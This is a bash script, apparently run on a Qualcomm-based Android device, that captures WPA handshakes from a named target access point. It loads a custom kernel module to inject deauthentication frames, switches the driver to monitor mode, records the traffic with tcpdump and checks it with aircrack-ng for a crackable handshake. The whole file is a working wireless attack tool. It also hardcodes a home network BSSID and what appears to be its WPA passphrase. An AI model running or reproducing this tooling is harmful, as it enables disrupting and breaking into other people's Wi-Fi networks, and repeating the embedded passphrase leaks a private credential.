#!/bin/bash
# grab_hs6.sh - Fast handshake capture with ~750ms mode switch
# Usage: grab_hs6.sh <BSSID> [SSID|auto] [CHANNEL] [ROUNDS]
# Example: grab_hs6.sh 8C:F0:DF:1F:4F:C7 Flymodem2631 7 10
set -o pipefail

BSSID="${1:?Usage: $0 <BSSID> [SSID|auto] [CHANNEL] [ROUNDS]}"
SSID_ARG="${2:-auto}"
CH="${3:-0}"
ROUNDS="${4:-10}"
CAPTURE_SEC="${5:-20}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"
DEAUTH_BURSTS=3  # connect+deauth attempts before switching to monitor

ch2freq() {
    case "$1" in
        1) echo 2412;; 2) echo 2417;; 3) echo 2422;; 4) echo 2427;;
        5) echo 2432;; 6) echo 2437;; 7) echo 2442;; 8) echo 2447;;
        9) echo 2452;; 10) echo 2457;; 11) echo 2462;; 12) echo 2467;; 13) echo 2472;;
        36) echo 5180;; 40) echo 5200;; 44) echo 5220;; 48) echo 5240;;
        *) echo $((2407 + $1 * 5));;
    esac
}

cleanup() {
    echo ""
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod kfind 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1
    insmod "$DRIVER" 2>/dev/null
    # Wait for wlan0
    for i in $(seq 1 60); do
        ip link show wlan0 &>/dev/null && break
        sleep 0.1
    done
    sleep 2
    systemctl start NetworkManager 2>/dev/null
    sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] Home WiFi restored."
}
trap cleanup EXIT

cd /tmp

# Set SSID from arg (auto-detect will override if needed)
[ "$SSID_ARG" != "auto" ] && SSID="$SSID_ARG"

# ===== Auto-detect SSID and channel =====
if [ "$SSID_ARG" = "auto" ] || [ "$CH" = "0" ]; then
    echo "[*] Scanning for $BSSID..."
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 1
    insmod "$DRIVER"
    for i in $(seq 1 60); do ip link show wlan0 &>/dev/null && break; sleep 0.1; done
    sleep 2
    ip link set wlan0 up
    SCAN=$(iw dev wlan0 scan 2>/dev/null)
    BSSID_LOWER=$(echo "$BSSID" | tr 'A-F' 'a-f')
    BLOCK=$(echo "$SCAN" | sed -n "/BSS ${BSSID_LOWER}/,/^BSS /p" | head -20)
    if [ "$SSID_ARG" = "auto" ]; then
        SSID=$(echo "$BLOCK" | grep "SSID:" | head -1 | sed 's/.*SSID: //')
        [ -z "$SSID" ] && { echo "[!] Could not find SSID for $BSSID"; exit 1; }
    else
        SSID="$SSID_ARG"
    fi
    if [ "$CH" = "0" ]; then
        CH=$(echo "$BLOCK" | grep "DS Parameter" | head -1 | sed 's/.*channel //')
        [ -z "$CH" ] && { echo "[!] Could not find channel for $BSSID"; exit 1; }
    fi
fi

FREQ=$(ch2freq "$CH")
echo ""
echo "============================================"
echo " Target: $SSID ($BSSID)"
echo " Channel: $CH ($FREQ MHz)"
echo " Rounds: $ROUNDS x ${DEAUTH_BURSTS} deauths"
echo " Capture: ${CAPTURE_SEC}s per round"
echo " Mode switch: ~750ms (fast polling)"
echo "============================================"
echo ""

# NOTE: petx8.ko BSSID should be patched on Mac before adb push
echo "[*] petx8.ko BSSID (pre-patched on host)"

# ===== Create wpa_supplicant config =====
cat > /tmp/wpa_target.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

rm -f /tmp/hs_grab*.pcap /tmp/handshake_result.pcap
HANDSHAKE_FOUND=0
TOTAL_EAPOL=0

for round in $(seq 1 "$ROUNDS"); do
    echo "========== ROUND $round/$ROUNDS =========="

    # ===== PHASE 1: STA mode + multiple deauth bursts =====
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod kfind 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 0.5

    insmod "$DRIVER"
    for i in $(seq 1 60); do ip link show wlan0 &>/dev/null && break; sleep 0.1; done
    sleep 2
    ip link set wlan0 up
    sleep 0.5

    DEAUTH_TOTAL=0

    for burst in $(seq 1 "$DEAUTH_BURSTS"); do
        # Start wpa_supplicant
        killall wpa_supplicant 2>/dev/null
        sleep 0.2
        rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
        dmesg > /tmp/.dmesg_before
        DMESG_BEFORE=$(wc -l < /tmp/.dmesg_before)

        wpa_supplicant -i wlan0 -c /tmp/wpa_target.conf -B -D nl80211 2>/dev/null

        # Poll dmesg for PE session creation (max 3s)
        PE_FOUND=0
        for w in $(seq 1 60); do
            DMESG_NOW=$(dmesg | wc -l)
            DMESG_NEW=$((DMESG_NOW - DMESG_BEFORE))
            [ "$DMESG_NEW" -lt 1 ] && DMESG_NEW=1
            if dmesg | tail -n "$DMESG_NEW" | grep -q "Connecting to"; then
                PE_FOUND=1
                break
            fi
            sleep 0.05
        done

        if [ "$PE_FOUND" -eq 1 ]; then
            # Fire petx8 immediately - PE session exists NOW
            for fire in 1 2 3; do
                rmmod kfind 2>/dev/null
                insmod /tmp/petx8.ko 2>/dev/null
            done
            DMESG_NOW=$(dmesg | wc -l)
            DMESG_NEW=$((DMESG_NOW - DMESG_BEFORE))
            [ "$DMESG_NEW" -lt 1 ] && DMESG_NEW=1
            D=$(dmesg | tail -n "$DMESG_NEW" | grep -c "calling lim_send\|Deauth TX")
            DEAUTH_TOTAL=$((DEAUTH_TOTAL + D))
        fi

        # Wait for connection attempt to finish before next burst
        sleep 0.3
        killall wpa_supplicant 2>/dev/null
        sleep 0.2
    done

    echo "  [*] Deauths sent: $DEAUTH_TOTAL"

    # ===== PHASE 2: FAST switch to monitor =====
    killall wpa_supplicant 2>/dev/null
    rmmod kfind 2>/dev/null

    T_START=$(date +%s%N)
    rmmod wlan
    insmod "$DRIVER" con_mode_monitor=4
    # Poll for wlan0 (typically ~200ms)
    for i in $(seq 1 100); do
        ip link show wlan0 &>/dev/null && break
        sleep 0.02
    done
    ip link set wlan0 up
    iw dev wlan0 set freq "$FREQ"
    T_END=$(date +%s%N)
    SWITCH_MS=$(( (T_END - T_START) / 1000000 ))
    echo "  [*] Mode switch: ${SWITCH_MS}ms"

    # ===== PHASE 3: Capture =====
    PCAP="/tmp/hs_grab${round}.pcap"
    echo "  [*] Capturing ch$CH for ${CAPTURE_SEC}s..."
    timeout "$CAPTURE_SEC" tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
    TCPDUMP_PID=$!

    # While capturing, show progress
    sleep "$CAPTURE_SEC"
    kill $TCPDUMP_PID 2>/dev/null
    wait $TCPDUMP_PID 2>/dev/null

    FSIZE=$(stat -c%s "$PCAP" 2>/dev/null || echo 0)

    # ===== Check EAPOL =====
    # Use tcpdump with ether proto filter for reliable EAPOL detection
    EAPOL=$(tcpdump -r "$PCAP" -e 2>/dev/null | grep -ic "802.1X\|EAPOL\|888e" || echo 0)
    # Also try raw hex search for 88 8e (ethertype)
    EAPOL2=$(tcpdump -r "$PCAP" -xx 2>/dev/null | grep -c "888e" || echo 0)

    echo "  [*] Size: ${FSIZE}B, EAPOL: $EAPOL (alt: $EAPOL2)"

    if [ "$EAPOL" -gt 0 ] || [ "$EAPOL2" -gt 2 ]; then
        echo "  [!!!] EAPOL DETECTED! Checking aircrack-ng..."
        timeout 10 aircrack-ng "$PCAP" 2>&1 | grep -E "handshake|EAPOL|WPA|network" | head -5
        HS=$(timeout 10 aircrack-ng "$PCAP" 2>&1 | grep -c "1 handshake")
        TOTAL_EAPOL=$((TOTAL_EAPOL + EAPOL))
        if [ "$HS" -gt 0 ]; then
            echo ""
            echo "  [!!!] ===== HANDSHAKE CAPTURED! ====="
            cp "$PCAP" /tmp/handshake_result.pcap
            HANDSHAKE_FOUND=1
            break
        fi
    fi
    echo ""
done

echo ""
echo "============================================"
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo " SUCCESS! Handshake: /tmp/handshake_result.pcap"
    echo " Pull with: adb pull /tmp/handshake_result.pcap"
else
    echo " No complete handshake in $ROUNDS rounds"
    echo " Total EAPOL fragments: $TOTAL_EAPOL"
    ls -la /tmp/hs_grab*.pcap 2>/dev/null
fi
echo "============================================"
